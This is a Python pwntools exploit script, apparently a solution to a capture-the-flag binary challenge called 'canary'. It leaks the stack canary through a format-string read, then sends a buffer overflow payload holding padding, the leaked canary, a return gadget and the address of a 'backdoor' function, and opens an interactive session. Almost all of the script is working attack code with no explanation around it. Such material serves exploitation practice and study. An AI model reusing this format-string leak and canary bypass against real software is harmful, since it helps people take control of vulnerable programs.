#!/usr/bin/env python
from pwn import *

conn = process("./canary")

def debug(cmd=''):
	cmd += "b main\n"
	gdb.attach(conn, cmd)
	pause()

fmt = b"%21$p"
conn.sendafter(b'Enter your name:\n', fmt)


conn.recvuntil("hello, 0x")
canary = int(conn.recvn(16), base=16)

print(hex(canary))


backdoor = 0x401244
ret = 0x4013A4
payload = b'a' * 0x78 + p64(canary)*2 + p64(ret)+p64(backdoor)

# debug()
conn.sendline(payload)

conn.interactive()